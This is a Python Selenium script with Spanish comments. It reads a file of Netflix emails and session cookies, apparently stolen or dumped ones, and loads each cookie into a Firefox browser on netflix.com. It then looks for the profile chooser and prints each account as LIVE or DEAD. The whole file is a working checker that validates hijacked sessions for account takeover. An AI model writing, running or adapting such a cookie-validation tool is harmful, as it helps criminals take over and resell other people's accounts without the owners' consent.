from selenium import webdriver
import time as tmp
from lxml import html
from colorama import Fore
import ast
import re


# with open('NETFLIX COOKIES X122.txt','r') as leer:
#     separacion_fracmentos = [line.strip().split('|') for line in leer] # cookies
#     rex = separacion_fracmentos[0][0].replace('Email:','')
#     Email = re.sub(r'\s+','',rex)
#     print(Email)


# matches = re.findall(r'Cookie: (.+?)\]',leer)
# # Si hay coincidencias
# if matches:
#     for cookie in range(len(matches)):
#         cookie_string = matches[cookie] + ']'
#         cookie_dict = ast.literal_eval(cookie_string)[0]
#         name = cookie_dict['name']
#         value = (cookie_dict['value'])
# else:
#     print("No se encontró ninguna cadena con el formato adecuado.")



def Netflix():
        with open('NETFLIX COOKIES X122.txt', 'r') as file_cookies:#leer_cookies
            read_cookies = file_cookies.read() # leer cookies
            matches = re.findall(r'Cookie: (.+?)\]',read_cookies)
            dominio = "netflix.com"
            driver = webdriver.Firefox()
            if matches:
                  with open('NETFLIX COOKIES X122.txt','r') as reads_cookies:
                        separacion_fracmentos = [line.strip().split('|') for line in reads_cookies] # cookies    
                        for num in range(len(matches)):#cookie
                            rex = separacion_fracmentos[num][0].replace('Email:','')
                            Email = re.sub(r'\s+','',rex)

                            cookie_string = matches[num] + ']'
                            cookie_dict = ast.literal_eval(cookie_string)[0]
                            name = cookie_dict['name']
                            value = cookie_dict['value']

                            driver.get("https://" + dominio)
                            tmp.sleep(5)
                            driver.delete_all_cookies()

                            cookie = {'name':name,'value':value}
                            driver.add_cookie(cookie)

                            tmp.sleep(5)

                            html_source = driver.page_source
                            parsed_html = html.fromstring(html_source)
                            element = parsed_html.xpath('//ul[@class="choose-profile"]')

                            if element:
                                print(f'{Fore.YELLOW}Cookie Linea {num} {Fore.GREEN}LIVE [✔] {Email}')            
                                driver.refresh()
                            else:
                                print(f"{Fore.YELLOW}Cookie Linea {num} {Fore.RED}DEAD [✘] {Email}")
                            tmp.sleep(3)
                            driver.refresh()
                            tmp.sleep(2)
            else:
                print("No se encontró ninguna cadena con el formato adecuado.")

Netflix()